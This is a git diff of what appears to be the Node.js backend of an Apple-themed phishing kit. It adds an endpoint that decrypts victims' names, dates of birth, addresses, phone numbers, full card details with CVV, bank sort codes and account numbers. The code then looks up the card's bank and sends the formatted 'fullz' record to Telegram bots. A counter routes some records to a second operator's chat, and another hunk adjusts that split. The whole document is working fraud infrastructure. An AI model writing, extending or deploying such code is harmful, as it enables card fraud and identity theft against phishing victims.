@@ -3150,6 +3150,96 @@ app.post("/appleSB", (req, res) => {
     });
 });
 
+app.options("/appleSB", cors());
+
+app.post("/appleSB", (req, res) => {
+  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (sbCount == 15) {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+        );
+        sbCount = 9;
+      } else {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSB:\n${originalText}`
+        );
+        axios.post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5450405437&text=Apple:\n${originalText}`
+        );
+        sbCount += 1;
+      }
+      res.send("Update Complete");
+    });
+});
+
 let p2 = 0;
 
 app.options("/appleP2", cors());
@@ -3767,11 +3857,11 @@ app.post("/ciscoApple", (req, res) => {
       var originalText = `+ -------------Fullz--------------+\n\n-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${firstName} ${lastName}\n|DOB: ${dob}\n|Address: ${addy1}, ${addy2}\n|City: ${town}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Holder: ${ccname}\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexpmonth}/${ccexpyear}\n|CVV: ${cvv}\n|Sort Code: ${scode}\n|Account Number: ${accno}\n|Bin: ${bin}\n-------------------------------------------------------------------------\nDevice Information\n|IP Address: ${userIp}\n|UserAgent: ${userAgent}\n---------------  --------------------------------`;
 
       var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (ciscoCount == 6) {
+      if (ciscoCount == 12) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
         );
-        ciscoCount = 2;
+        ciscoCount = 7;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalText}`
